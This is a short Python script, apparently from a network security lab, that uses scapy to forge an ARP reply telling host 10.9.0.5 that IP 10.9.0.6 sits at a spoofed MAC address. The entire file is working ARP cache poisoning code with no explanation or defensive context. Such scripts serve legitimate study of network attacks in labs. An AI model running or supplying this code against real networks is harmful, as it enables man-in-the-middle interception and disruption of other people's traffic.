#!/usr/bin/python3

from scapy.all import *

IP_V = "10.9.0.5"
MAC_V = "02:42:0a:09:00:05"

IP_T = "10.9.0.6"
MAC_T = "02:42:0a:09:00:69"

# Create ARP Reply Packet
ether = Ether(src=MAC_T, dst=MAC_V)
arp = ARP(psrc=IP_T, hwsrc=MAC_T, pdst=IP_V, hwdst=MAC_V)
arp.op = 2

frame = ether/arp
sendp(frame)

